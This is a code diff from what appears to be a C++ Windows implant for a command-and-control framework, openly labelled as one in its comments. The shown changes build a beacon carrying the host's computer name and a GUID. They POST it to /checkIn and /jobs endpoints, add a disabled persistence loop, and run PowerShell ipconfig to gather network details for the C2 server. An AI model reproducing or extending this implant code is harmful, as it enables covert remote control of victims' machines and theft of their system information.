@@ -39,7 +39,7 @@ int wmain()
         size_t number = 100000 + (rand() * range) / RAND_MAX;
         std::string sleepTimer = std::to_string(number);
         std::string mName(infoBuf, bufCharCount);
-        checkin = checkin + guid + "\", \"sleepTime\": " + sleepTimer + ", \"computername\": \"" + mName + "\", \"DHKey\": \"Nada\"}";
+        checkin = checkin + guid + "\", \"sleepTime\": " + sleepTimer + ", \"computerName\": \"" + mName + "\", \"agentId\": \"1337\"}";
         std::cout << checkin << std::endl;
         
         // if successful, connect to the server
@@ -70,10 +70,14 @@ int wmain()
         client->header_size = 28;
         client->requestData = checkin.c_str();
         client->data_size = checkin.size();
-        std::wcout << client->makeHttpRequest(L"POST", L"/checkIn", tls) << std::endl;
+        std::cout << client->makeHttpRequest(L"POST", L"/checkIn", tls) << std::endl;
 
-        //std::wcout << client->makeHttpRequest(L"POST", L"/jobs", tls) << std::endl;
+        bool iamImmortal = false;
+        while(iamImmortal){
+            //Sleep(number);
+        }
 
+        std::cout << client->makeHttpRequest(L"POST", L"/jobs", tls) << std::endl;
         // implant first checks the Computer Name and IP address. Then sends it to the c2
         std::system("powershell ipconfig >C:\\Users\\User\\test.txt");
         std::ifstream temp_file("C:\\Users\\User\\test.txt");
